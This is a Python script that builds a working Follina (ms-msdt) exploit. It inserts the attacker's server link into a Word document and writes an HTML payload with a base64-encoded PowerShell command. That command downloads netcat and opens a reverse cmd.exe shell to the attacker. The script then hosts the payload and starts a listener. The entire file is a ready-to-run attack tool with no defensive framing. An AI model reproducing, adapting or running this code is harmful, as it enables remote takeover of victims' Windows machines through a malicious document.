from random import choice
from base64 import b64encode
from string import ascii_lowercase
from shutil import make_archive
from os import rename, system
from subprocess import check_output
import netifaces

i = str(input('Enter Interface (default eth0): '))
i = 'eth0' if len(i) == 0 else i

try:
	IP = netifaces.ifaddresses(i)[netifaces.AF_INET][0]["addr"]
except ValueError:
	print("Couldn't get your IP")
	exit()


def create_document(PORT_ONE):
    LINK=f"http://{IP}:{PORT_ONE}/index.html"
    document_rels_path = "_document/word/_rels/document.xml.rels"

    with open(document_rels_path, 'r') as f_read:
        xml = f_read.read()
    
    edited_with_link = xml.replace('{html_link}', LINK)

    with open(document_rels_path, 'w') as f_write:
        f_write.write(edited_with_link)
    
    make_archive('document', 'zip', '_document')
    rename('document.zip', 'document.doc')
    print("Successfully saved as document.doc!")

    removed_link = xml.replace(LINK, '{html_link}')
    with open(document_rels_path, 'w') as f_write:
        f_write.write(removed_link)

def host_server(PORT_ONE, PORT_TWO):
    command = f"""Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {IP} {PORT_TWO}"""
    command_encoded = b64encode(command.encode()).decode()
    
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{command_encoded}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += ("".join([choice(ascii_lowercase) for _ in range(4096)])+ "\n</script>")

    with open('io/index.html', 'w') as f:
        f.write(html_payload)
    
    try:
    	system(f'python3 -m http.server -d io/ {PORT_ONE} > /dev/null 2>&1 &')
    	system(f'nc -lnvp {PORT_TWO} -s {IP}')
    except KeyboardInterrupt:
    	system('kill nc')
    	system('kill python3')

try:
    netcat_port = int(input("Enter port for NetCat: "))
    server_port = int(input("Enter port for HTTP Server: "))
except:
    print('Invalid Input!')
    exit()

create_document(server_port)
host_server(server_port, netcat_port)
